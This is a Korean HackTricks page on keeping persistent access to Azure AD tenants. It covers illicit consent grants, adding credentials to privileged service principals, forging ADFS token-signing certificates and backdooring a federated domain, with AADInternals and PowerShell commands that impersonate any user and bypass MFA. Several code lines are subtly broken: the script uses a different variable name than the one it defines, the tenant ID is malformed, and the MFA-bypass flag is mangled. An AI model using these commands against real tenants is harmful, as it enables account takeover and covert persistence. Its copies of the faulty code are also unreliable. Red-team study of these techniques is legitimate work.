# Az - 지속성

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
{% endhint %}

### 부정한 동의 부여

기본적으로 모든 사용자는 Azure AD에서 응용 프로그램을 등록할 수 있습니다. 따라서 특정 테넌트를 위한 응용 프로그램을 등록할 수 있습니다. 이 응용 프로그램은 관리자 동의(관리자인 경우 승인)가 필요한 고영향 권한(사용자 대신 메일 보내기, 역할 관리 등)을 필요로 합니다. 이를 통해 **피싱 공격을 실행**할 수 있으며, 성공할 경우 매우 **효과적**일 것입니다.

또한 응용 프로그램을 자신의 사용자로 수락하여 액세스를 유지할 수도 있습니다.

### 응용 프로그램 및 서비스 주체

응용 프로그램 관리자, GA 또는 microsoft.directory/applications/credentials/update 권한을 가진 사용자 지정 역할을 사용하여 기존 응용 프로그램에 자격 증명(비밀 또는 인증서)을 추가할 수 있습니다.

**높은 권한을 가진 응용 프로그램을 대상으로**하거나 **높은 권한을 가진 새 응용 프로그램을 추가**할 수 있습니다.

응용 프로그램에 추가할 수 있는 흥미로운 역할 중 하나는 **특권 인증 관리자 역할**입니다. 이 역할은 **글로벌 관리자의 비밀번호를 재설정**할 수 있도록 합니다.

이 기술은 또한 **MFA 우회**를 허용합니다.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* 인증서 기반 인증
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### 연합 - 토큰 서명 인증서

온프레미스 AD에서 **DA 권한**을 가지고 있다면 매우 오랜 유효 기간을 가진 **새로운 토큰 서명** 및 **토큰 해독 인증서**를 생성하고 가져올 수 있습니다. 이를 통해 우리는 우리가 알고 있는 ImuutableID를 가진 **모든 사용자로 로그인**할 수 있습니다.

다음 명령을 **ADFS 서버에서 DA로 실행**하여 새로운 인증서를 생성하고(default password 'AADInternals'), ADFS에 추가하고 자동 롤오버를 비활성화하고 서비스를 다시 시작하십시오:
```powershell
New-AADIntADFSSelfSignedCertificates
```
그럼, Azure AD와 인증서 정보를 업데이트하세요:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### 연합 - 신뢰하는 도메인

GA 권한이 있는 테넌트에서는 **새 도메인을 추가**할 수 있으며(검증되어야 함), 해당 도메인의 인증 유형을 연합으로 구성하고 도메인을 **특정 인증서**(아래 명령어의 any.sts) 및 발급자를 신뢰하도록 구성할 수 있습니다:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## 참고 자료

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* 해킹 팁을 공유하려면 [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
{% endhint %}
